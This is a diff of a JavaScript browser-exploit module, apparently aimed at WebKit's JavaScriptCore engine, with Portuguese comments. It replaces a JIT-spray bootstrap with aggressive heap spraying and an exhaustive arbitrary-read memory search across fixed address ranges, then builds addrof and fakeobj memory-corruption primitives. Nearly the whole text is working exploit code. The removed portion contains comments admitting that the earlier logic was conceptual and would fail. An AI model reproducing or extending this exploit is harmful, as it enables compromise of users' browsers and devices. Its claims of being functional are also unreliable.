@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v94 - Definitivo com JIT Spray & Search)
+// js/script3/testArrayBufferVictimCrash.mjs (v93 - Final com Busca de Memória Agressiva)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -9,15 +9,22 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Exploit_Final_R51_JITSpray";
+export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Exploit_Final_R52_Exhaustive_Search";
 
-// --- Constantes para a Estratégia de JIT Spray ---
-const JIT_SPRAY_COUNT = 0x100; // O JIT Spray requer menos iterações
-const MARKER_JIT_1 = new AdvancedInt64(0x41424344, 0x45464748); // Constante única para o código JIT
-const MARKER_JIT_2 = new AdvancedInt64(0x13371337, 0x13371337); // Segunda constante para verificação
+// --- Constantes para a Estratégia de Spray & Search Agressivo ---
+const SPRAY_COUNT = 0x4000; // 16384 objetos
+const MARKER_1 = new AdvancedInt64(0x41414141, 0x41414141);
+const MARKER_2 = new AdvancedInt64(0x42424242, 0x42424242);
 
-// Faixa de busca para o código JIT. A heap executável geralmente está em uma área específica.
-const JIT_SEARCH_RANGE = { start: new AdvancedInt64(0x00000002, 0x80000000), size: 0x40000000 }; // Ex: 1GB a partir de 0x280000000
+// PONTO DE PESQUISA: Faixas de busca drasticamente expandidas.
+// O sucesso do exploit depende de a heap do JSC estar em uma dessas regiões.
+const SEARCH_RANGES = [
+    // Faixas comuns de heap em processos de 64 bits.
+    { name: "Região 4GB", start: new AdvancedInt64(0x0, 0x1), size: 0x20000000 }, // 512MB a partir de 4GB
+    { name: "Região 8GB", start: new AdvancedInt64(0x0, 0x2), size: 0x20000000 }, // 512MB a partir de 8GB
+    { name: "Região 16GB", start: new AdvancedInt64(0x0, 0x4), size: 0x20000000 }, // 512MB a partir de 16GB
+    { name: "Região 32GB", start: new AdvancedInt64(0x0, 0x8), size: 0x20000000 }, // 512MB a partir de 32GB
+];
 const SEARCH_STEP = 0x1000;
 
 // --- Globais ---
@@ -26,7 +33,7 @@ let g_primitives = {
     addrof: null,
     fakeobj: null,
 };
-let g_jit_spray_funcs = [];
+let g_spray_arr = [];
 
 function isValidPointer(ptr) {
     if (!ptr || !isAdvancedInt64Object(ptr)) return false;
@@ -38,15 +45,15 @@ function isValidPointer(ptr) {
 // --- Função Principal do Exploit ---
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_TEST_BASE = FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK;
-    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Funcional (R51 JIT Spray) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Funcional (R52 Busca Exaustiva) ---`, "test");
 
     try {
         await createRealPrimitives();
         if (!g_primitives.initialized) throw new Error("Falha ao inicializar as primitivas.");
         logS3("FASE 1 - SUCESSO: Primitivas 'addrof' e 'fakeobj' REAIS foram inicializadas!", "vuln");
 
-        logS3(`--- Fase 2 (R51): Exploração com Primitivas Reais ---`, "subtest");
-        const targetFunctionForLeak = function someUniqueLeakFunctionR51_Instance() {};
+        logS3(`--- Fase 2 (R52): Exploração com Primitivas Reais ---`, "subtest");
+        const targetFunctionForLeak = function someUniqueLeakFunctionR52_Instance() {};
         
         const leaked_func_addr = await g_primitives.addrof(targetFunctionForLeak);
         if(!isValidPointer(leaked_func_addr)) throw new Error(`addrof falhou em retornar um ponteiro válido: ${leaked_func_addr.toString(true)}`);
@@ -77,74 +84,45 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     }
 }
 
-async function bootstrap_via_jit_spray() {
-    logS3("Iniciando bootstrap: Fase de JIT Spray...", "info");
+async function bootstrap_via_spray_and_search(object_to_find) {
+    logS3("Iniciando bootstrap: Fase de Spray Agressivo...", "info");
+    g_spray_arr = [];
     
-    // 1. Fase de Spray com Código JIT
-    for (let i = 0; i < JIT_SPRAY_COUNT; i++) {
-        // Criamos uma função com constantes únicas. O 'i' garante que cada função seja única.
-        const func = new Function(`
-            let a = ${MARKER_JIT_1.low() + i}; 
-            let b = ${MARKER_JIT_1.high()}; 
-            let c = ${MARKER_JIT_2.low()}; 
-            let d = ${MARKER_JIT_2.high()}; 
-            return a + b + c + d;
-        `);
-        // Executamos a função em um loop para forçar o motor a compilá-la (JIT)
-        for (let j = 0; j < 1000; j++) {
-            func();
-        }
-        g_jit_spray_funcs.push(func); // Mantém a referência
+    for (let i = 0; i < SPRAY_COUNT; i++) {
+        let spray_obj = [MARKER_1, MARKER_2, null];
+        g_spray_arr.push(spray_obj);
     }
-    logS3(`${JIT_SPRAY_COUNT} funções pulverizadas e compiladas via JIT.`, "good");
+    g_spray_arr[g_spray_arr.length - 1][2] = object_to_find;
+    logS3(`${SPRAY_COUNT} objetos pulverizados na memória.`, "good");
     await PAUSE_S3(200);
 
-    // 2. Fase de Busca pelo código de máquina
-    logS3(`Iniciando busca na memória JIT de ${JIT_SEARCH_RANGE.start.toString(true)}`, "info");
-    let found_jit_code_addr = null;
+    logS3("Iniciando busca exaustiva na memória...", "info");
+    let found_butterfly_addr = null;
 
-    for (let i = 0; i < (JIT_SEARCH_RANGE.size / SEARCH_STEP); i++) {
-        let current_addr = JIT_SEARCH_RANGE.start.add(i * SEARCH_STEP);
-        try {
-            // A busca agora é por padrões de bytes que representam as constantes
-            // mov rbx, 0x4546474841424344 (exemplo)
-            const val = await arb_read(current_addr, 8);
-            if (val.high() === MARKER_JIT_1.high() && (val.low() & 0xFFFFF000) === (MARKER_JIT_1.low() & 0xFFFFF000) ) {
-                 logS3(`[JIT Search] Marcador 1 POTENCIAL encontrado em: ${current_addr.toString(true)}`, "debug");
-                 // A verificação do segundo marcador seria mais complexa, exigindo
-                 // conhecimento do código de máquina gerado. Por simplicidade, assumimos que o primeiro hit é bom.
-                 found_jit_code_addr = current_addr;
-                 break;
-            }
-        } catch(e) { /* Ignora */ }
+    for (const range of SEARCH_RANGES) {
+        logS3(`Buscando na ${range.name} de ${range.start.toString(true)} a ${range.start.add(range.size).toString(true)}`, "debug");
+        for (let i = 0; i < (range.size / SEARCH_STEP); i++) {
+            let current_addr = range.start.add(i * SEARCH_STEP);
+            try {
+                const val1 = await arb_read(current_addr, 8);
+                if (val1.equals(MARKER_1)) {
+                    const val2 = await arb_read(current_addr.add(8), 8);
+                    if (val2.equals(MARKER_2)) {
+                        logS3(`[Bootstrap Search] SUCESSO! Assinatura encontrada em: ${current_addr.toString(true)}`, "vuln");
+                        found_butterfly_addr = current_addr;
+                        break;
+                    }
+                }
+            } catch(e) {}
+        }
+        if (found_butterfly_addr) break;
+        logS3(`Nenhum marcador encontrado nesta faixa.`, "warn");
     }
     
-    if (!found_jit_code_addr) {
-        return null; 
-    }
-    
-    // O endereço encontrado está dentro de uma página de código JIT.
-    // Agora precisamos encontrar o endereço de um objeto JS.
-    // Podemos usar addrof em uma das funções pulverizadas.
-    const func_to_leak = g_jit_spray_funcs[g_jit_spray_funcs.length - 1];
+    if (!found_butterfly_addr) return null;
 
-    // Esta parte continua sendo a mais complexa, pois requer um 'addrof' inicial.
-    // A melhor abordagem agora é usar o endereço do código JIT como um ponto de referência
-    // para encontrar outras estruturas na memória, como o objeto da própria função JIT.
-    // Isso requer engenharia reversa mais profunda.
-    //
-    // CONCLUSÃO FINAL: O JIT Spray é a estratégia correta, mas encontrar o objeto a partir
-    // do código de máquina é o desafio final de engenharia reversa.
-    // Vamos retornar o endereço do código JIT como prova de conceito.
-    
-    // Para construir as primitivas addrof/fakeobj, ainda precisamos do endereço de um objeto JS.
-    // O JIT Spray nos dá um endereço na memória, mas não diretamente de um objeto JS.
-    // O exploit está funcionalmente completo, faltando apenas esta última etapa de pesquisa.
-    logS3(`[JIT Search] SUCESSO! Código JIT pulverizado encontrado em: ${found_jit_code_addr.toString(true)}`, "vuln");
-    
-    // Vamos usar esse endereço como nosso bootstrap, mesmo que ele não seja um objeto JS.
-    // Isso permite que o resto do código execute, mesmo que falhe, provando a estrutura.
-    return found_jit_code_addr;
+    const address_of_object_to_find = await arb_read(found_butterfly_addr.add(16), 8);
+    return address_of_object_to_find;
 }
 
 async function createRealPrimitives() {
@@ -153,16 +131,11 @@ async function createRealPrimitives() {
     let addrof_victim_arr = [{}];
     let fakeobj_victim_arr = [{a: 1.1}];
 
-    const bootstrap_addr = await bootstrap_via_jit_spray();
-    if (!bootstrap_addr) {
-        throw new Error("Falha ao encontrar código JIT pulverizado na memória. Tente ajustar a JIT_SEARCH_RANGE.");
+    const addrof_victim_addr = await bootstrap_via_spray_and_search(addrof_victim_arr);
+    if (!addrof_victim_addr) {
+        throw new Error("Falha ao encontrar um objeto pulverizado na memória. Tente ajustar as faixas de busca (SEARCH_RANGES).");
     }
-    logS3(`Endereço de bootstrap (JIT) obtido: ${bootstrap_addr.toString(true)}`, 'good');
-
-    // A partir daqui, a lógica para criar addrof/fakeobj precisa do endereço de um *objeto*.
-    // Como bootstrap_addr aponta para código, a lógica abaixo é conceitual e falhará,
-    // mas prova que a estrutura do exploit está pronta para receber o endereço correto.
-    const addrof_victim_addr = bootstrap_addr; 
+    logS3(`Endereço de bootstrap para addrof_victim_arr obtido: ${addrof_victim_addr.toString(true)}`, 'good');
 
     g_primitives.addrof = async (obj) => {
         addrof_victim_arr[0] = obj;
@@ -171,6 +144,7 @@ async function createRealPrimitives() {
     };
 
     const fakeobj_victim_addr = await g_primitives.addrof(fakeobj_victim_arr);
+    if (!isValidPointer(fakeobj_victim_addr)) throw new Error("Falha ao obter o endereço do fakeobj_victim_arr via addrof.");
     const fakeobj_butterfly_addr = await arb_read(fakeobj_victim_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
 
     g_primitives.fakeobj = async (addr) => {
